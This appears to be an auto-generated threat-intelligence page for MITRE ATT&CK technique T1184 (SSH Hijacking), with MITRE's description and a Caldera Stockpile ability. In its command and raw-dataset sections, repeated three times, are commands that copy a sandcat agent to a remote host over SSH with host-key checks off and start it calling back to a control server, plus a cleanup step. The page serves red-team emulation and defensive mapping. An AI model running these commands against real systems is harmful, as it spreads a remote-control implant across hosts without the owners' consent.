
# SSH Hijacking

## Description

### MITRE Description

> Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.

In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)

[SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'root']
* Platforms: ['Linux', 'macOS']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1184

## Potential Commands

```
{'darwin': {'sh': {'command': "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", 'cleanup': "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", 'payloads': ['sandcat.go-darwin']}}, 'linux': {'sh': {'command': "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go &&\nssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{remote.ssh.cmd} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'\n", 'cleanup': "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'pkill -f sandcat & rm -f ~/sandcat.go'\n", 'payloads': ['sandcat.go-linux']}}}
```

## Commands Dataset

```
[{'command': {'darwin': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 '
                                           "#{remote.ssh.cmd} 'pkill -f "
                                           "sandcat & rm -f ~/sandcat.go'\n",
                                'command': 'scp -o StrictHostKeyChecking=no -o '
                                           'UserKnownHostsFile=/dev/null -o '
                                           'ConnectTimeout=3 sandcat.go-darwin '
                                           '#{remote.ssh.cmd}:~/sandcat.go &&\n'
                                           'ssh -o StrictHostKeyChecking=no -o '
                                           'UserKnownHostsFile=/dev/null -o '
                                           'ConnectTimeout=3 #{remote.ssh.cmd} '
                                           "'nohup ./sandcat.go -server "
                                           '#{server} -group red 1>/dev/null '
                                           "2>/dev/null &'\n",
                                'payloads': ['sandcat.go-darwin']}},
              'linux': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 -o '
                                          'StrictHostKeyChecking=no '
                                          "#{remote.ssh.cmd} 'pkill -f sandcat "
                                          "& rm -f ~/sandcat.go'\n",
                               'command': 'scp -o StrictHostKeyChecking=no -o '
                                          'UserKnownHostsFile=/dev/null -o '
                                          'ConnectTimeout=3 sandcat.go-linux '
                                          '#{remote.ssh.cmd}:~/sandcat.go &&\n'
                                          'ssh -o StrictHostKeyChecking=no -o '
                                          'UserKnownHostsFile=/dev/null -o '
                                          'ConnectTimeout=3 #{remote.ssh.cmd} '
                                          "'nohup ./sandcat.go -server "
                                          '#{server} -group red 1>/dev/null '
                                          "2>/dev/null &'\n",
                               'payloads': ['sandcat.go-linux']}}},
  'name': 'Copy 54ndc47 to remote host and start it, assumes target uses SSH '
          'keys and passwordless authentication',
  'source': 'data/abilities/lateral-movement/10a9d979-e342-418a-a9b0-002c483e0fa6.yml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Mitre Stockpile - Copy 54ndc47 to remote host and start it, assumes target uses SSH keys and passwordless authentication': {'description': 'Copy '
                                                                                                                                              '54ndc47 '
                                                                                                                                              'to '
                                                                                                                                              'remote '
                                                                                                                                              'host '
                                                                                                                                              'and '
                                                                                                                                              'start '
                                                                                                                                              'it, '
                                                                                                                                              'assumes '
                                                                                                                                              'target '
                                                                                                                                              'uses '
                                                                                                                                              'SSH '
                                                                                                                                              'keys '
                                                                                                                                              'and '
                                                                                                                                              'passwordless '
                                                                                                                                              'authentication',
                                                                                                                               'id': '10a9d979-e342-418a-a9b0-002c483e0fa6',
                                                                                                                               'name': 'Start '
                                                                                                                                       '54ndc47',
                                                                                                                               'platforms': {'darwin': {'sh': {'cleanup': 'ssh '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'ConnectTimeout=3 '
                                                                                                                                                                          '#{remote.ssh.cmd} '
                                                                                                                                                                          "'pkill "
                                                                                                                                                                          '-f '
                                                                                                                                                                          'sandcat '
                                                                                                                                                                          '& '
                                                                                                                                                                          'rm '
                                                                                                                                                                          '-f '
                                                                                                                                                                          "~/sandcat.go'\n",
                                                                                                                                                               'command': 'scp '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'StrictHostKeyChecking=no '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'UserKnownHostsFile=/dev/null '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'ConnectTimeout=3 '
                                                                                                                                                                          'sandcat.go-darwin '
                                                                                                                                                                          '#{remote.ssh.cmd}:~/sandcat.go '
                                                                                                                                                                          '&&\n'
                                                                                                                                                                          'ssh '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'StrictHostKeyChecking=no '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'UserKnownHostsFile=/dev/null '
                                                                                                                                                                          '-o '
                                                                                                                                                                          'ConnectTimeout=3 '
                                                                                                                                                                          '#{remote.ssh.cmd} '
                                                                                                                                                                          "'nohup "
                                                                                                                                                                          './sandcat.go '
                                                                                                                                                                          '-server '
                                                                                                                                                                          '#{server} '
                                                                                                                                                                          '-group '
                                                                                                                                                                          'red '
                                                                                                                                                                          '1>/dev/null '
                                                                                                                                                                          '2>/dev/null '
                                                                                                                                                                          "&'\n",
                                                                                                                                                               'payloads': ['sandcat.go-darwin']}},
                                                                                                                                             'linux': {'sh': {'cleanup': 'ssh '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'ConnectTimeout=3 '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'StrictHostKeyChecking=no '
                                                                                                                                                                         '#{remote.ssh.cmd} '
                                                                                                                                                                         "'pkill "
                                                                                                                                                                         '-f '
                                                                                                                                                                         'sandcat '
                                                                                                                                                                         '& '
                                                                                                                                                                         'rm '
                                                                                                                                                                         '-f '
                                                                                                                                                                         "~/sandcat.go'\n",
                                                                                                                                                              'command': 'scp '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'StrictHostKeyChecking=no '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'UserKnownHostsFile=/dev/null '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'ConnectTimeout=3 '
                                                                                                                                                                         'sandcat.go-linux '
                                                                                                                                                                         '#{remote.ssh.cmd}:~/sandcat.go '
                                                                                                                                                                         '&&\n'
                                                                                                                                                                         'ssh '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'StrictHostKeyChecking=no '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'UserKnownHostsFile=/dev/null '
                                                                                                                                                                         '-o '
                                                                                                                                                                         'ConnectTimeout=3 '
                                                                                                                                                                         '#{remote.ssh.cmd} '
                                                                                                                                                                         "'nohup "
                                                                                                                                                                         './sandcat.go '
                                                                                                                                                                         '-server '
                                                                                                                                                                         '#{server} '
                                                                                                                                                                         '-group '
                                                                                                                                                                         'red '
                                                                                                                                                                         '1>/dev/null '
                                                                                                                                                                         '2>/dev/null '
                                                                                                                                                                         "&'\n",
                                                                                                                                                              'payloads': ['sandcat.go-linux']}}},
                                                                                                                               'tactic': 'lateral-movement',
                                                                                                                               'technique': {'attack_id': 'T1184',
                                                                                                                                             'name': 'SSH '
                                                                                                                                                     'Hijacking'}}}]
```

# Tactics


* [Lateral Movement](../tactics/Lateral-Movement.md)


# Mitigations

None

# Actors

None
